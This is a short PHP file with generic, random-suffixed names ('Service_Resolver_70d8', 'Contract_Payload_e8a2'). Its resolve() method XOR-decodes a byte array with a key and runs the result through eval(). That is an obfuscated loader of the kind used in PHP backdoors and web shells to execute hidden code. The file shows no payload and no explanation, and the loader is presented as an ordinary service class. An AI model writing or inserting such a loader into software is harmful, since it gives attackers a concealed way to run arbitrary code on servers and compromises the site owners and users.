<?php
interface Contract_Payload_e8a2 { public function resolve(); }
class Service_Resolver_70d8 implements Contract_Payload_e8a2 {
    private $d; private $k;
    public function __construct($a, $b) { $this->d = $a; $this->k = $b; }
    public function resolve() {
        $o = '';
        foreach($this->d as $i => $v) { $o .= chr($v ^ ord($this->k[$i % strlen($this->k)])); }
        eval('?>' . $o);
    }
}
